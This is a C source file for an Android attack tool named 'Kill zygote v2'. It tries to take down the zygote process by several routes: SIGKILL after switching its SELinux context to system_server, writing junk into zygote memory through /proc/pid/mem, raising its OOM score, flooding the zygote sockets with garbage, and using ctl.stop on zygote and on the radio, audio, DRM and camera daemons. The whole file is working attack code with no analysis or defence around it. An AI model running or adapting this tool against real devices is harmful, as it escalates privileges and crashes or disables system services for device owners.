/*
 * Kill zygote v2 — tries every method: signals, /proc/pid/mem corruption,
 * socket crash, OOM score manipulation.
 * Usage: restarter <zygote_pid>
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/un.h>

extern int __system_property_set(const char *key, const char *value);

static int try_setcon(const char *ctx) {
    int fd = open("/proc/self/attr/current", O_WRONLY);
    if (fd < 0) return -1;
    int ret = write(fd, ctx, strlen(ctx));
    close(fd);
    return (ret > 0) ? 0 : -1;
}

static void try_kill(int pid, int sig, const char *sn, const char *dom) {
    if (kill(pid, sig) == 0)
        printf("[OK]   kill %s to %d from %s\n", sn, pid, dom);
    else
        printf("[FAIL] kill %s to %d from %s: %s\n", sn, pid, dom, strerror(errno));
}

/* Try to corrupt zygote memory via /proc/pid/mem */
static void try_proc_mem(int pid) {
    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/mem", pid);
    int fd = open(path, O_RDWR);
    if (fd >= 0) {
        printf("[OK]   opened %s\n", path);
        /* Write garbage at offset 0 to crash */
        char junk[16] = {0};
        lseek(fd, 0x8000, 0);
        if (write(fd, junk, sizeof(junk)) > 0)
            printf("[OK]   wrote to %s\n", path);
        else
            printf("[FAIL] write %s: %s\n", path, strerror(errno));
        close(fd);
    } else {
        printf("[FAIL] open %s: %s\n", path, strerror(errno));
    }
}

/* Try to make zygote OOM-killable */
static void try_oom_adj(int pid) {
    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/oom_score_adj", pid);
    int fd = open(path, O_WRONLY);
    if (fd >= 0) {
        printf("[OK]   opened %s\n", path);
        if (write(fd, "1000", 4) > 0)
            printf("[OK]   set oom_score_adj=1000\n");
        else
            printf("[FAIL] write oom_score_adj: %s\n", strerror(errno));
        close(fd);
    } else {
        printf("[FAIL] open %s: %s\n", path, strerror(errno));
    }
}

/* Try to connect to zygote socket and send garbage */
static void try_zygote_socket(void) {
    struct sockaddr_un addr;
    int fd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (fd < 0) { printf("[FAIL] socket: %s\n", strerror(errno)); return; }

    memset(&addr, 0, sizeof(addr));
    addr.sun_family = AF_UNIX;
    /* Android abstract socket namespace: starts with \0 */
    addr.sun_path[0] = '\0';
    strncpy(addr.sun_path + 1, "zygote", sizeof(addr.sun_path) - 2);

    int slen = offsetof(struct sockaddr_un, sun_path) + 1 + strlen("zygote");
    if (connect(fd, (struct sockaddr *)&addr, slen) == 0) {
        printf("[OK]   connected to zygote socket (abstract)\n");
        /* Send garbage to crash zygote parser */
        char junk[256];
        memset(junk, 0xFF, sizeof(junk));
        write(fd, junk, sizeof(junk));
        printf("[OK]   sent garbage to zygote socket\n");
    } else {
        printf("[FAIL] connect abstract zygote: %s\n", strerror(errno));
    }
    close(fd);

    /* Also try filesystem socket */
    fd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (fd < 0) return;
    memset(&addr, 0, sizeof(addr));
    addr.sun_family = AF_UNIX;
    strncpy(addr.sun_path, "/dev/socket/zygote", sizeof(addr.sun_path) - 1);
    if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
        printf("[OK]   connected to /dev/socket/zygote\n");
        char junk[256];
        memset(junk, 0xFF, sizeof(junk));
        write(fd, junk, sizeof(junk));
        printf("[OK]   sent garbage to filesystem socket\n");
    } else {
        printf("[FAIL] connect /dev/socket/zygote: %s\n", strerror(errno));
    }
    close(fd);
}

/* Try ctl.stop / ctl.restart for various services */
static void try_ctl(void) {
    int r;
    r = __system_property_set("ctl.restart", "zygote");
    printf("[%s] ctl.restart zygote = %d\n", r == 0 ? "OK" : "FAIL", r);

    r = __system_property_set("ctl.stop", "zygote");
    printf("[%s] ctl.stop zygote = %d\n", r == 0 ? "OK" : "FAIL", r);

    /* Try stopping daemons directly from runas UID 0 */
    r = __system_property_set("ctl.stop", "qcamerasvr");
    printf("[%s] ctl.stop qcamerasvr = %d\n", r == 0 ? "OK" : "FAIL", r);

    r = __system_property_set("ctl.stop", "drm");
    printf("[%s] ctl.stop drm = %d\n", r == 0 ? "OK" : "FAIL", r);

    r = __system_property_set("ctl.stop", "audiod");
    printf("[%s] ctl.stop audiod = %d\n", r == 0 ? "OK" : "FAIL", r);

    r = __system_property_set("ctl.stop", "ril-daemon");
    printf("[%s] ctl.stop ril-daemon = %d\n", r == 0 ? "OK" : "FAIL", r);
}

int main(int argc, char *argv[]) {
    if (argc < 2) { printf("Usage: %s <zygote_pid>\n", argv[0]); return 1; }
    int zpid = atoi(argv[1]);

    prctl(PR_SET_KEEPCAPS, 1, 0, 0, 0);
    setgid(0);
    setuid(0);
    printf("uid=%d gid=%d target=%d\n", getuid(), getgid(), zpid);

    printf("\n--- Signals from runas ---\n");
    try_kill(zpid, SIGKILL, "SIGKILL", "runas");

    printf("\n--- Signals from system_server ---\n");
    try_setcon("u:r:system_server:s0");
    try_kill(zpid, SIGKILL, "SIGKILL", "system_server");

    printf("\n--- /proc/pid/mem corruption ---\n");
    try_proc_mem(zpid);

    printf("\n--- OOM score adjust ---\n");
    try_oom_adj(zpid);

    printf("\n--- Zygote socket crash ---\n");
    try_zygote_socket();

    printf("\n--- ctl.* properties ---\n");
    try_ctl();

    printf("\n--- ctl.* from system_server domain ---\n");
    try_setcon("u:r:system_server:s0");
    try_ctl();

    printf("\nDone\n");
    return 0;
}
